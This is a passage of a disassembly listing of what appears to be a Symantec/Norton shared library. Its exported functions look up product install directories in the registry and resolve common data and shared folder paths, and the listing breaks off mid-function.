; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal173(wchar_t *Src)
		public Ordinal173
Ordinal173	proc near		; DATA XREF: .rdata:off_6AF66098o

var_5C		= byte ptr -5Ch
var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= byte ptr -48h
Args		= byte ptr -28h
var_24		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Src		= dword	ptr  8

		mov	eax, offset unknown_libname_38 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 50h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		mov	[ebp+var_14], eax
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_5C]
		call	Ordinal1228
		lea	eax, [ebp+Args]
		push	eax		; Args
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		mov	dword ptr [ebp+Args], ebx
		call	Ordinal180
		test	al, al
		jnz	short loc_6AF3506E
		push	offset aCindexvalue_34 ; "CIndexValueCollection::AddValue(LPCWSTR"...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF35150
; ---------------------------------------------------------------------------

loc_6AF3506E:				; CODE XREF: Ordinal173+41j
		push	offset aCindexvalue_35 ; "CIndexValueCollection::AddValue(LPCWSTR"...
		lea	ecx, [ebp+var_48]
		call	Ordinal751
		mov	ecx, dword ptr [ebp+Args]
		push	[ebp+Src]	; Src
		add	ecx, 3Ch
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF348E7

loc_6AF3508D:				; DATA XREF: Ordinal173+C6o
					; Ordinal173+11Bo
		lea	ecx, [ebp+var_48]
		call	Ordinal753
		test	eax, eax
		jz	loc_6AF3513C
		xor	bl, bl
		jmp	loc_6AF35148
; ---------------------------------------------------------------------------

loc_6AF350A4:				; DATA XREF: .rdata:6AF624D0o
		push	13h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3508D
		retn
; ---------------------------------------------------------------------------

loc_6AF350E7:				; DATA XREF: .rdata:6AF624E0o
		push	15h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	eax, [ebp+var_4C]
		push	dword ptr [eax]
		lea	eax, [ebp+var_24]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+var_24]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3508D
		retn
; ---------------------------------------------------------------------------

loc_6AF3513C:				; CODE XREF: Ordinal173+7Cj
		mov	eax, dword ptr [ebp+Args]
		mov	dword ptr [eax+8], 8
		mov	bl, 1

loc_6AF35148:				; CODE XREF: Ordinal173+84j
		lea	ecx, [ebp+var_48]
		call	Ordinal752

loc_6AF35150:				; CODE XREF: Ordinal173+4Ej
		lea	ecx, [ebp+var_5C]
		call	Ordinal1230
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	al, bl
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal173	endp ; sp-analysis failed

; Exported entry 181.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal181
Ordinal181	proc near		; CODE XREF: Ordinal129+3p
					; DATA XREF: .rdata:off_6AF66098o
		mov	eax, ecx
		mov	dword ptr [eax], offset	off_6AF556C4
		retn
Ordinal181	endp

; Exported entry 182.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal182
Ordinal182	proc near		; CODE XREF: Ordinal130+6j
					; DATA XREF: .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF556C4
		retn
Ordinal182	endp

; Exported entry 183.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal183(LPCSTR	lpValueName, LPSTR lpData, LPDWORD lpcbData)
		public Ordinal183
Ordinal183	proc near		; CODE XREF: Ordinal191+Dp
					; Ordinal193+Dp ...

var_C		= byte ptr -0Ch
lpValueName	= dword	ptr  8
lpData		= dword	ptr  0Ch
lpcbData	= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		lea	ecx, [ebp+var_C]
		call	Ordinal988
		xor	ebx, ebx
		push	ebx		; int
		push	20019h		; samDesired
		push	offset aSoftwareSyma_1 ; "Software\\Symantec\\InstalledApps"
		push	80000002h	; hKey
		lea	ecx, [ebp+var_C]
		call	Ordinal993
		test	eax, eax
		jnz	short loc_6AF351BD
		push	offset aCinstalledapps ; "CInstalledApps::GetDirectory() : reg.Op"...

loc_6AF351B5:				; CODE XREF: Ordinal183+54j
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF351E4
; ---------------------------------------------------------------------------

loc_6AF351BD:				; CODE XREF: Ordinal183+2Bj
		push	[ebp+lpcbData]	; lpcbData
		lea	ecx, [ebp+var_C]
		push	[ebp+lpData]	; lpData
		push	[ebp+lpValueName] ; lpValueName
		call	Ordinal1002
		test	eax, eax
		jnz	short loc_6AF351D9
		push	offset aCinstalledap_0 ; "CInstalledApps::GetDirectory() : reg.Ge"...
		jmp	short loc_6AF351B5
; ---------------------------------------------------------------------------

loc_6AF351D9:				; CODE XREF: Ordinal183+4Dj
		push	[ebp+lpData]	; pszPath
		call	ds:PathRemoveBackslashA
		mov	bl, 1

loc_6AF351E4:				; CODE XREF: Ordinal183+38j
		lea	ecx, [ebp+var_C]
		call	Ordinal990
		mov	al, bl
		pop	ebx
		leave
		retn
Ordinal183	endp

; Exported entry 191.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal191(LPSTR lpData, LPDWORD lpcbData)
		public Ordinal191
Ordinal191	proc near		; CODE XREF: Ordinal221j
					; DATA XREF: .rdata:off_6AF66098o

lpData		= dword	ptr  4
lpcbData	= dword	ptr  8

		push	[esp+lpcbData]	; lpcbData
		push	[esp+4+lpData]	; lpData
		push	offset aNav	; "NAV"
		call	Ordinal183
		add	esp, 0Ch
		retn
Ordinal191	endp

; Exported entry 193.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal193(LPSTR lpData, LPDWORD lpcbData)
		public Ordinal193
Ordinal193	proc near		; CODE XREF: Ordinal220j
					; DATA XREF: .rdata:off_6AF66098o

lpData		= dword	ptr  4
lpcbData	= dword	ptr  8

		push	[esp+lpcbData]	; lpcbData
		push	[esp+4+lpData]	; lpData
		push	offset aNortonInternet ; "Norton Internet Security"
		call	Ordinal183
		add	esp, 0Ch
		test	al, al
		jnz	short loc_6AF3523A
		push	[esp+lpcbData]	; lpcbData
		push	[esp+4+lpData]	; lpData
		push	offset aInternetSecuri ; "Internet Security"
		call	Ordinal183
		add	esp, 0Ch
		test	al, al
		jnz	short loc_6AF3523A
		retn
; ---------------------------------------------------------------------------

loc_6AF3523A:				; CODE XREF: Ordinal193+17j
					; Ordinal193+30j
		mov	al, 1
		retn
Ordinal193	endp

; Exported entry 195.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal195(LPSTR lpData, LPDWORD lpcbData)
		public Ordinal195
Ordinal195	proc near		; DATA XREF: .rdata:off_6AF66098o

lpData		= dword	ptr  4
lpcbData	= dword	ptr  8

		push	[esp+lpcbData]	; lpcbData
		push	[esp+4+lpData]	; lpData
		push	offset aNortonIntern_0 ; "Norton Internet Security Data"
		call	Ordinal183
		add	esp, 0Ch
		test	al, al
		jnz	short loc_6AF35270
		push	[esp+lpcbData]	; lpcbData
		push	[esp+4+lpData]	; lpData
		push	offset aInternetSecu_0 ; "Internet Security Data"
		call	Ordinal183
		add	esp, 0Ch
		test	al, al
		jnz	short loc_6AF35270
		retn
; ---------------------------------------------------------------------------

loc_6AF35270:				; CODE XREF: Ordinal195+17j
					; Ordinal195+30j
		mov	al, 1
		retn
Ordinal195	endp

; Exported entry 197.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal197(LPSTR lpData, LPDWORD lpcbData)
		public Ordinal197
Ordinal197	proc near		; CODE XREF: Ordinal222j
					; DATA XREF: .rdata:off_6AF66098o

lpData		= dword	ptr  4
lpcbData	= dword	ptr  8

		push	[esp+lpcbData]	; lpcbData
		push	[esp+4+lpData]	; lpData
		push	offset aAntispam ; "AntiSpam"
		call	Ordinal183
		add	esp, 0Ch
		retn
Ordinal197	endp

; Exported entry 199.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal199(LPSTR lpData, LPDWORD lpcbData)
		public Ordinal199
Ordinal199	proc near		; CODE XREF: Ordinal223j
					; DATA XREF: .rdata:off_6AF66098o

lpData		= dword	ptr  4
lpcbData	= dword	ptr  8

		push	[esp+lpcbData]	; lpcbData
		push	[esp+4+lpData]	; lpData
		push	offset aAntispamEngine ; "AntiSpam Engine"
		call	Ordinal183
		add	esp, 0Ch
		retn
Ordinal199	endp

; Exported entry 201.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal201(LPSTR lpData, LPDWORD lpcbData)
		public Ordinal201
Ordinal201	proc near		; CODE XREF: Ordinal224j
					; DATA XREF: .rdata:off_6AF66098o

lpData		= dword	ptr  4
lpcbData	= dword	ptr  8

		push	[esp+lpcbData]	; lpcbData
		push	[esp+4+lpData]	; lpData
		push	offset aAdblocking ; "AdBlocking"
		call	Ordinal183
		add	esp, 0Ch
		retn
Ordinal201	endp

; Exported entry 203.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal203(LPSTR lpData, LPDWORD lpcbData)
		public Ordinal203
Ordinal203	proc near		; CODE XREF: Ordinal225j
					; DATA XREF: .rdata:off_6AF66098o

lpData		= dword	ptr  4
lpcbData	= dword	ptr  8

		push	[esp+lpcbData]	; lpcbData
		push	[esp+4+lpData]	; lpData
		push	offset aSpbbc	; "SPBBC"
		call	Ordinal183
		add	esp, 0Ch
		retn
Ordinal203	endp

; [0000001D BYTES: COLLAPSED FUNCTION unknown_libname_2. PRESS KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_6AF352E8(int,	char *Dest, int)
sub_6AF352E8	proc near		; CODE XREF: Ordinal187+25p
					; sub_6AF3585C+29p ...

arg_0		= dword	ptr  4
Dest		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_0]
		mov	eax, [eax]
		push	esi
		mov	esi, [eax-0Ch]
		push	edi
		mov	edi, [esp+8+arg_8]
		inc	esi
		cmp	esi, [edi]
		ja	short loc_6AF3530B
		push	eax		; Source
		push	[esp+0Ch+Dest]	; Dest
		call	strcpy
		pop	ecx
		mov	al, 1
		jmp	short loc_6AF35319
; ---------------------------------------------------------------------------

loc_6AF3530B:				; CODE XREF: sub_6AF352E8+12j
		push	offset aCinstalleda_12 ; "CInstalledApps::ConvertCStringToSz() : "...
		call	sub_6AF3102E
		mov	[edi], esi
		xor	al, al

loc_6AF35319:				; CODE XREF: sub_6AF352E8+21j
		pop	ecx
		pop	edi
		pop	esi
		retn
sub_6AF352E8	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3531D	proc near		; CODE XREF: Ordinal188+54p
					; sub_6AF35645+32p ...

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		cmp	eax, 0FFFFFFFFh
		push	esi
		mov	esi, ecx
		jnz	short loc_6AF35336
		mov	eax, [esi]
		test	eax, eax
		jz	short loc_6AF35336
		push	eax		; Str
		call	strlen
		pop	ecx

loc_6AF35336:				; CODE XREF: sub_6AF3531D+Aj
					; sub_6AF3531D+10j
		push	eax
		mov	ecx, esi
		call	sub_6AF3155D
		pop	esi
		retn	4
sub_6AF3531D	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_6AF35342(int,	void *Src, size_t Size,	int, int)
sub_6AF35342	proc near		; CODE XREF: sub_6AF35385+4Fp

arg_0		= dword	ptr  8
Src		= dword	ptr  0Ch
Size		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_10]
		mov	ecx, [ebp+arg_0]
		push	ebx
		push	esi
		mov	esi, [ebp+Size]
		push	edi
		lea	edi, [esi+eax]
		push	edi
		call	sub_6AF31911
		push	esi		; Size
		push	[ebp+Src]	; Src
		mov	ebx, eax
		push	ebx		; Dst
		call	memcpy
		push	[ebp+arg_10]	; Size
		add	ebx, esi
		push	[ebp+arg_C]	; Src
		push	ebx		; Dst
		call	memcpy
		mov	ecx, [ebp+arg_0]
		add	esp, 18h
		push	edi
		call	sub_6AF3155D
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn
sub_6AF35342	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_6AF35385(int,	int, char *Str)
sub_6AF35385	proc near		; CODE XREF: Ordinal188+DFp
					; sub_6AF35645+B7p ...

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
Str		= dword	ptr  10h

		mov	eax, offset unknown_libname_39 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		and	[ebp+var_10], 0
		push	esi
		mov	esi, [ebp+arg_4]
		mov	eax, [esi]
		mov	ecx, [eax-10h]
		mov	eax, [ecx]
		call	dword ptr [eax+10h]
		mov	edx, [eax]
		mov	ecx, eax
		call	dword ptr [edx+0Ch]
		add	eax, 10h
		mov	[ebp+arg_4], eax
		and	[ebp+var_4], 0
		cmp	[ebp+Str], 0
		jnz	short loc_6AF353BD
		xor	eax, eax
		jmp	short loc_6AF353C6
; ---------------------------------------------------------------------------

loc_6AF353BD:				; CODE XREF: sub_6AF35385+32j
		push	[ebp+Str]	; Str
		call	strlen
		pop	ecx

loc_6AF353C6:				; CODE XREF: sub_6AF35385+36j
		mov	ecx, [esi]
		push	eax		; int
		push	[ebp+Str]	; int
		lea	eax, [ebp+arg_4]
		push	dword ptr [ecx-0Ch] ; Size
		push	ecx		; Src
		push	eax		; int
		call	sub_6AF35342
		mov	ecx, [ebp+arg_0]
		add	esp, 14h
		lea	eax, [ebp+arg_4]
		push	eax
		call	sub_6AF316B7
		mov	ecx, [ebp+arg_4]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D
		mov	ecx, [ebp+var_C]
		mov	eax, [ebp+arg_0]
		pop	esi
		mov	large fs:0, ecx
		leave
		retn
sub_6AF35385	endp

; Exported entry 184.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal184(LPCSTR	lpValueName, int)
		public Ordinal184
Ordinal184	proc near		; CODE XREF: Ordinal192+9p
					; Ordinal194+9p ...

var_C		= byte ptr -0Ch
lpValueName	= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		lea	ecx, [ebp+var_C]
		call	Ordinal988
		xor	ebx, ebx
		push	ebx		; int
		push	20019h		; samDesired
		push	offset aSoftwareSyma_1 ; "Software\\Symantec\\InstalledApps"
		push	80000002h	; hKey
		lea	ecx, [ebp+var_C]
		call	Ordinal993
		test	eax, eax
		jnz	short loc_6AF3543D
		push	offset aCinstalledapps ; "CInstalledApps::GetDirectory() : reg.Op"...

loc_6AF35435:				; CODE XREF: Ordinal184+51j
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF35462
; ---------------------------------------------------------------------------

loc_6AF3543D:				; CODE XREF: Ordinal184+2Bj
		push	[ebp+arg_4]	; int
		lea	ecx, [ebp+var_C]
		push	[ebp+lpValueName] ; lpValueName
		call	Ordinal1003
		test	eax, eax
		jnz	short loc_6AF35456
		push	offset aCinstalledap_0 ; "CInstalledApps::GetDirectory() : reg.Ge"...
		jmp	short loc_6AF35435
; ---------------------------------------------------------------------------

loc_6AF35456:				; CODE XREF: Ordinal184+4Aj
		mov	ecx, [ebp+arg_4]
		push	5Ch
		call	sub_6AF3213B
		mov	bl, 1

loc_6AF35462:				; CODE XREF: Ordinal184+38j
		lea	ecx, [ebp+var_C]
		call	Ordinal990
		mov	al, bl
		pop	ebx
		leave
		retn
Ordinal184	endp

; Exported entry 192.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal192
Ordinal192	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	[esp+arg_0]	; int
		push	offset aNav	; "NAV"
		call	Ordinal184
		pop	ecx
		pop	ecx
		retn
Ordinal192	endp

; Exported entry 194.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal194
Ordinal194	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	[esp+arg_0]	; int
		push	offset aNortonInternet ; "Norton Internet Security"
		call	Ordinal184
		test	al, al
		pop	ecx
		pop	ecx
		jnz	short loc_6AF354A9
		push	[esp+arg_0]	; int
		push	offset aInternetSecuri ; "Internet Security"
		call	Ordinal184
		test	al, al
		pop	ecx
		pop	ecx
		jnz	short loc_6AF354A9
		retn
; ---------------------------------------------------------------------------

loc_6AF354A9:				; CODE XREF: Ordinal194+12j
					; Ordinal194+26j
		mov	al, 1
		retn
Ordinal194	endp

; Exported entry 196.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal196
Ordinal196	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	[esp+arg_0]	; int
		push	offset aNortonIntern_0 ; "Norton Internet Security Data"
		call	Ordinal184
		test	al, al
		pop	ecx
		pop	ecx
		jnz	short loc_6AF354D5
		push	[esp+arg_0]	; int
		push	offset aInternetSecu_0 ; "Internet Security Data"
		call	Ordinal184
		test	al, al
		pop	ecx
		pop	ecx
		jnz	short loc_6AF354D5
		retn
; ---------------------------------------------------------------------------

loc_6AF354D5:				; CODE XREF: Ordinal196+12j
					; Ordinal196+26j
		mov	al, 1
		retn
Ordinal196	endp

; Exported entry 198.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal198
Ordinal198	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	[esp+arg_0]	; int
		push	offset aAntispam ; "AntiSpam"
		call	Ordinal184
		pop	ecx
		pop	ecx
		retn
Ordinal198	endp

; Exported entry 200.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal200
Ordinal200	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	[esp+arg_0]	; int
		push	offset aAntispamEngine ; "AntiSpam Engine"
		call	Ordinal184
		pop	ecx
		pop	ecx
		retn
Ordinal200	endp

; Exported entry 202.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal202
Ordinal202	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	[esp+arg_0]	; int
		push	offset aAdblocking ; "AdBlocking"
		call	Ordinal184
		pop	ecx
		pop	ecx
		retn
Ordinal202	endp

; Exported entry 204.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal204
Ordinal204	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	[esp+arg_0]	; int
		push	offset aSpbbc	; "SPBBC"
		call	Ordinal184
		pop	ecx
		pop	ecx
		retn
Ordinal204	endp

; Exported entry 188.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal188
Ordinal188	proc near		; CODE XREF: Ordinal187+11p
					; DATA XREF: .rdata:off_6AF66098o

var_14		= byte ptr -14h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		push	edi
		mov	edi, [ebp+arg_0]
		push	edi		; int
		push	offset aCommonClientDa ; "Common Client	Data"
		call	Ordinal184
		test	al, al
		pop	ecx
		pop	ecx
		jnz	loc_6AF35629
		push	esi		; Args
		push	offset aCinstalledap_1 ; "CInstalledApps::GetCCDataDirectory() : "...
		call	sub_6AF3101A
		pop	ecx
		lea	ecx, [ebp+var_4]
		call	sub_6AF318C3
		push	1		; fCreate
		push	23h		; csidl
		push	104h
		lea	ecx, [ebp+var_4]
		call	sub_6AF31911
		push	eax		; pszPath
		push	0		; hwnd
		call	ds:SHGetSpecialFolderPathA
		push	0FFFFFFFFh
		lea	ecx, [ebp+var_4]
		mov	esi, eax
		call	sub_6AF3531D
		test	esi, esi
		pop	esi
		jnz	short loc_6AF355DB
		lea	ecx, [ebp+var_14]
		call	Ordinal988
		push	0		; int
		push	20019h		; samDesired
		push	offset aSoftwareMicros ; "Software\\Microsoft\\Windows\\CurrentVersi"...
		push	80000002h	; hKey
		lea	ecx, [ebp+var_14]
		call	Ordinal993
		test	eax, eax
		jnz	short loc_6AF355B7
		push	offset aCinstalledap_2 ; "CInstalledApps::GetCCDataDirectory() : "...

loc_6AF355A4:				; CODE XREF: Ordinal188+B5j
		call	sub_6AF3102E
		pop	ecx
		lea	ecx, [ebp+var_14]
		call	Ordinal990
		jmp	loc_6AF35639
; ---------------------------------------------------------------------------

loc_6AF355B7:				; CODE XREF: Ordinal188+81j
		lea	eax, [ebp+var_4]
		push	eax		; int
		push	offset aCommonAppdata ;	"Common	AppData"
		lea	ecx, [ebp+var_14]
		call	Ordinal1003
		test	eax, eax
		jnz	short loc_6AF355D3
		push	offset aCinstalledap_3 ; "CInstalledApps::GetCCDataDirectory() : "...
		jmp	short loc_6AF355A4
; ---------------------------------------------------------------------------

loc_6AF355D3:				; CODE XREF: Ordinal188+AEj
		lea	ecx, [ebp+var_14]
		call	Ordinal990

loc_6AF355DB:				; CODE XREF: Ordinal188+5Cj
		mov	eax, [ebp+var_4]
		cmp	dword ptr [eax-0Ch], 0
		jz	short loc_6AF3562E
		push	5Ch
		lea	ecx, [ebp+var_4]
		call	sub_6AF3213B
		push	offset Str	; "\\Symantec\\Common Client"
		lea	eax, [ebp+var_4]
		push	eax		; int
		lea	eax, [ebp+var_8]
		push	eax		; int
		call	sub_6AF35385
		add	esp, 0Ch
		push	eax
		mov	ecx, edi
		call	sub_6AF31C41
		lea	ecx, [ebp+var_8]
		call	sub_6AF3789B
		push	dword ptr [edi]	; Args
		push	offset aCinstalledap_4 ; "CInstalledApps::GetCCDataDirectory() : "...
		call	sub_6AF31006
		pop	ecx
		pop	ecx
		lea	ecx, [ebp+var_4]
		call	sub_6AF3789B

loc_6AF35629:				; CODE XREF: Ordinal188+19j
		mov	al, 1

loc_6AF3562B:				; CODE XREF: Ordinal188+127j
		pop	edi
		leave
		retn
; ---------------------------------------------------------------------------

loc_6AF3562E:				; CODE XREF: Ordinal188+C6j
		push	offset aCinstalledap_5 ; "CInstalledApps::GetCCDataDirectory() : "...
		call	sub_6AF3102E
		pop	ecx

loc_6AF35639:				; CODE XREF: Ordinal188+96j
		lea	ecx, [ebp+var_4]
		call	sub_6AF3789B
		xor	al, al
		jmp	short loc_6AF3562B
Ordinal188	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF35645	proc near		; CODE XREF: Ordinal186+24p
					; Ordinal190+34p ...

var_14		= byte ptr -14h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		push	ebx
		push	esi
		lea	ecx, [ebp+var_4]
		call	sub_6AF318C3
		push	1		; fCreate
		push	2Bh		; csidl
		push	104h
		lea	ecx, [ebp+var_4]
		call	sub_6AF31911
		push	eax		; pszPath
		xor	ebx, ebx
		push	ebx		; hwnd
		call	ds:SHGetSpecialFolderPathA
		push	0FFFFFFFFh
		lea	ecx, [ebp+var_4]
		mov	esi, eax
		call	sub_6AF3531D
		cmp	esi, ebx
		jnz	short loc_6AF356DD
		lea	ecx, [ebp+var_14]
		call	Ordinal988
		push	ebx		; int
		push	20019h		; samDesired
		push	offset aSoftwareMicr_0 ; "Software\\Microsoft\\Windows\\CurrentVersi"...
		push	80000002h	; hKey
		lea	ecx, [ebp+var_14]
		call	Ordinal993
		test	eax, eax
		jnz	short loc_6AF356B9
		push	offset aCinstalledap_6 ; "CInstalledApps::GetSymSharedDirectory()"...

loc_6AF356A9:				; CODE XREF: sub_6AF35645+8Ej
		call	sub_6AF3102E
		pop	ecx
		lea	ecx, [ebp+var_14]
		call	Ordinal990
		jmp	short loc_6AF35724
; ---------------------------------------------------------------------------

loc_6AF356B9:				; CODE XREF: sub_6AF35645+5Dj
		lea	eax, [ebp+var_4]
		push	eax		; int
		push	offset aCommonfilesdir ; "CommonFilesDir"
		lea	ecx, [ebp+var_14]
		call	Ordinal1003
		test	eax, eax
		jnz	short loc_6AF356D5
		push	offset aCinstalledap_7 ; "CInstalledApps::GetSymSharedDirectory()"...
		jmp	short loc_6AF356A9
; ---------------------------------------------------------------------------

loc_6AF356D5:				; CODE XREF: sub_6AF35645+87j
		lea	ecx, [ebp+var_14]
		call	Ordinal990

loc_6AF356DD:				; CODE XREF: sub_6AF35645+39j
		mov	eax, [ebp+var_4]
		cmp	[eax-0Ch], ebx
		jz	short loc_6AF35719
		push	5Ch
		lea	ecx, [ebp+var_4]
		call	sub_6AF3213B
		push	offset aSymantecShared ; "\\Symantec Shared"
		lea	eax, [ebp+var_4]
		push	eax		; int
		lea	eax, [ebp+var_8]
		push	eax		; int
		call	sub_6AF35385
		mov	ecx, [ebp+arg_0]
		add	esp, 0Ch
		push	eax
		call	sub_6AF31C41
		lea	ecx, [ebp+var_8]
		call	sub_6AF3789B
		mov	bl, 1
		jmp	short loc_6AF35724
; ---------------------------------------------------------------------------

loc_6AF35719:				; CODE XREF: sub_6AF35645+9Ej
		push	offset aCinstalledap_8 ; "CInstalledApps::GetSymSharedDirectory()"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF35724:				; CODE XREF: sub_6AF35645+72j
					; sub_6AF35645+D2j
		lea	ecx, [ebp+var_4]
		call	sub_6AF3789B
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn
sub_6AF35645	endp

; Exported entry 186.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal186
Ordinal186	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	ebx
		push	esi
		mov	esi, [esp+8+arg_0]
		push	esi		; int
		push	offset aCommonClient ; "Common Client"
		call	Ordinal184
		mov	bl, al
		test	bl, bl
		pop	ecx
		pop	ecx
		jnz	short loc_6AF3577D
		push	offset aCinstalledap_9 ; "CInstalledApps::GetCCDirectory() : Fail"...
		call	sub_6AF3101A
		push	esi
		call	sub_6AF35645
		mov	bl, al
		test	bl, bl
		pop	ecx
		pop	ecx
		jnz	short loc_6AF3576F
		push	offset aCinstalleda_10 ; "CInstalledApps::GetCCDirectory() : unab"...
		call	sub_6AF3102E
		jmp	short loc_6AF3577C
; ---------------------------------------------------------------------------

loc_6AF3576F:				; CODE XREF: Ordinal186+2Fj
		push	dword ptr [esi]	; Args
		push	offset aCinstalleda_11 ; "CInstalledApps::GetCCDirectory() : back"...
		call	sub_6AF31006
		pop	ecx

loc_6AF3577C:				; CODE XREF: Ordinal186+3Bj
		pop	ecx

loc_6AF3577D:				; CODE XREF: Ordinal186+17j
		pop	esi
		mov	al, bl
		pop	ebx
		retn
Ordinal186	endp

; Exported entry 187.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal187(char *Dest, int)
		public Ordinal187
Ordinal187	proc near		; DATA XREF: .rdata:off_6AF66098o

var_4		= dword	ptr -4
Dest		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		lea	ecx, [ebp+var_4]
		call	sub_6AF318C3
		lea	eax, [ebp+var_4]
		push	eax
		call	Ordinal188
		cmp	al, 1
		pop	ecx
		jnz	short loc_6AF357B3
		push	[ebp+arg_4]	; int
		lea	eax, [ebp+var_4]
		push	[ebp+Dest]	; Dest
		push	eax		; int
		call	sub_6AF352E8
		add	esp, 0Ch
		mov	bl, al
		jmp	short loc_6AF357C0
; ---------------------------------------------------------------------------

loc_6AF357B3:				; CODE XREF: Ordinal187+19j
		push	offset aCinstalleda_13 ; "CInstalledApps::GetCCDataDirectory() : "...
		call	sub_6AF3102E
		pop	ecx
		xor	bl, bl

loc_6AF357C0:				; CODE XREF: Ordinal187+2Fj
		lea	ecx, [ebp+var_4]
		call	sub_6AF3789B
		mov	al, bl
		pop	ebx
		leave
		retn
Ordinal187	endp

; Exported entry 190.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal190
Ordinal190	proc near		; CODE XREF: Ordinal189+11p
					; DATA XREF: .rdata:off_6AF66098o

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
